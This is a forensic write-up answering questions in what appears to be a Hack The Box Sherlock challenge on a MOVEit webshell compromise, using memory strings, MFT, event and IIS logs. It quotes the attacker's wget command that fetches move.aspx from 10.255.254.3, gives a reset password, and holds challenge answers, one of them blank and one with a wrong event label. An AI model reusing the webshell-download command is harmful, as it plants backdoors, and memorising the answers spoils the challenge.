**Sherlock Scenario:**
We have unfortunately been hiding under a rock and did not see the many news articles referencing the recent MOVEit CVE being exploited in the wild. We believe our Windows server may be vulnerable and has recently fallen victim to this compromise. We need to understand this exploit in a bit more detail and confirm the actions of the attacker & retrieve some details so we can implement them into our SOC environment. We have provided you with a triage of all the necessary artifacts from our compromised Windows server. PS: One of the artifacts is a memory dump, but we forgot to include the vmss file. You might have to go back to basics here...


**Given:**
- .vmem
- Rapid Triage Directory (Kape)
- Windows Event Logs (C:\Users\johnn\Downloads\SherlockPractice\iliketo\Triage\Triage\uploads\auto\C%3A\Windows\System32\winevt\Logs)
- IIS Log (Microsoft Internet Information Services) - C:\Users\johnn\Downloads\SherlockPractice\iliketo\Triage\Triage\uploads\auto\C%3A\inetpub\logs\LogFiles\W3SVC2
- SQL Source file - C:\Users\johnn\Downloads\SherlockPractice\iliketo\Triage\Triage\uploads


**Data Preparation:**

**Memory Dump (kali)** - Warning- This won't work because the question states that  vmss file is missing so use "strings" instead
```
python3 vol.py -f '/home/kali/Downloads/Sherlock/volatility3-1.0.0/volatility3-1.0.0/I-like-to-27a787c5.vmem' windows.info
```




**Creating MFT output CSV**
```
.\MFTECmd.exe -f 'C:\Users\johnn\Downloads\SherlockPractice\iliketo\Triage\Triage\uploads\ntfs\%5C%5C.%5CC%3A\$MFT' --csv C:\Users\johnn\Downloads\SherlockPractice\iliketo\ --csvf MFT.csv
```



**EvtxECmd.exe**
Note: cd to \EvtxeCmd path first the run the bellow command


Creating kape_event_log_Security.csv from Security log
```
.\EvtxECmd.exe -f 'C:\Users\johnn\Downloads\SherlockPractice\iliketo\Triage\Triage\uploads\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx' --csv C:\Users\johnn\Downloads\SherlockPractice\iliketo\ --csvf kape_event_log_security.csv
```











**Questions**

- Name of the ASPX webshell uploaded by the attacker?

Run the following "strings" command to grep .aspx extensions from the memory dump.

```
 strings ./I-like-to-27a787c5.vmem | grep .aspx
```

It's definitely suspicious as we can see the download link and files

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/da0573c8-dfbb-40a6-8bbf-9e2dd74bcb75)


Also if we scroll down, we can see the command wget for downloading the suspicious move.aspx file

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/2bb7d595-8fae-4652-9f25-33c092c3cb3a)


Answer: move.aspx


- What was the attacker's IP address?

Output from previous question

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/7728c6ee-b3d7-4925-8950-a1b44f448c66)


Answer: 10.255.254.3

- What user agent was used to perform the initial attack?

IIS Log

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/119787c8-791c-47a8-a719-2cff6b5806d2)



Answer: Ruby


- When was the ASPX webshell uploaded by the attacker?

Upload our generated MFT.csv to Timeline Explorer, then seach for "move.aspx"

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/ce974463-a033-43d4-890e-36f29e72fc36)


Answer: 12/07/2023 11:24:30


- The attacker uploaded an ASP webshell which didn't work, what is its filesize in bytes?

From Microsoft Defender Event logs, we can see the malicious warning state that the name is "backdoor;ASP/Webshell!MSR". It also indicate the malicious file and path. From this we know that "moveit.asp" is the cause of Microsoft Defender to take action against it.

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/992a6ffb-9afb-4a31-b9e0-970ff468a080)


Now, we have the the of the malicious webshell file, we just need to go back to our "MFT.CSV" in Timeline Explorer and search for the keyword "moveit.asp" to obtain the size of file

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/de538c43-6d85-4b8c-8ca1-a4dd461f14fc)



Answer: 1362

- Which tool did the attacker use to initially enumerate the vulnerable server?

IIS Log

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/56e3091f-eec3-463e-b1bd-5584ea76a2fa)



Answer: nmap

- We suspect the attacker may have changed the password for our service account. Please confirm the time this occurred (UTC)

Open Security log event CSV in TImeline explorer and filter for event 4624 (password reset)

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/a7d4bb00-6a8b-4a39-ba9f-88fb284eb067)




Answer: 12/07/2023 11:09:27



- Which protocol did the attacker utilize to remote into the compromised machine?

In windows security log, search for the suspicious IP "10.255.254.3" with event code 4624 (Success logon)

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/78b82c73-2403-462a-842e-943ef7014f1e)



If we further inspect the event, we'll see the the Logon type is 10 which corresponds to RDP

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/b6a547cd-58f0-47fb-ac43-c1e2d393252e)



Answer: RDP

- Please confirm the date and time the attacker remotely accessed the compromised machine?


Follow up the previous question with event 4624, we we inspect XML view, we can see the actual system time that the attack logon to the machine

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/f7eedf53-662e-4838-8b7f-0014e9ff3397)


Alternatively, we can filter for event 4624 in windows security log in form of CSV

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/519a33d8-9bd0-4e92-88f5-a8802f6a9ae4)



Answer: 12/07/2023 11:11:18


- What was the useragent that the attacker used to access the webshell?

IIS Log

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/ada68c97-57db-4d45-9898-9b107428cd00)



Answer: Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0


- What is the inst ID of the attacker?

Open moveit.sql in any editor and search for "2023-07-12" because we know that is the date where the attack happened.

We see some interesting information here and the corresponding "inst_add" that we're looking for

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/4f68d5bb-13ab-4911-ae41-0c9e133358da)



We know the format that the potential inst ID that we're looking for is in this format (the value locates after 'inst_add' )

```
1,'2023-06-14 02:21:48','inst_add',0,
```

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/202ac76a-a0b6-4a93-b803-0f0248ea21e1)



Answer: 1234



- What command was run by the attacker to retrieve the webshell?

Run the following "strings" command to grep .aspx extensions from the memory dump.

Command Line:
```
strings ./I-like-to-27a787c5.vmem | grep .aspx 
```
![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/ebce06b7-b60c-4efa-8827-98e712ee1396)




Answer: wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx

- What was the string within the title header of the webshell deployed by the TA?


![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/a108fc21-6944-4b0f-873d-077390626d38)


When grepping string from .vmem with "move.aspx", we encounter some kind of form. Therefore, we want to try to inspect the whole form by running the following command:

```
strings ./I-like-to-27a787c5.vmem | grep 'form name="cmd"' -A 40 -B 20
```

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/65cc20b2-6980-4846-9c8c-64db077d7e86)


Answer: 

- What did the TA change the our moveitsvc account password to?

Run the strings command on .vmem and filter for keyword "net user"


```
strings ./I-like-to-27a787c5.vmem | grep "net user"    
```

![image](https://github.com/jirayus013t/cybersecurityprojects/assets/49973180/2ff1dc1b-ee34-4c1e-b631-df3c1d61613a)


Answer: 5trongP4ssw0rd
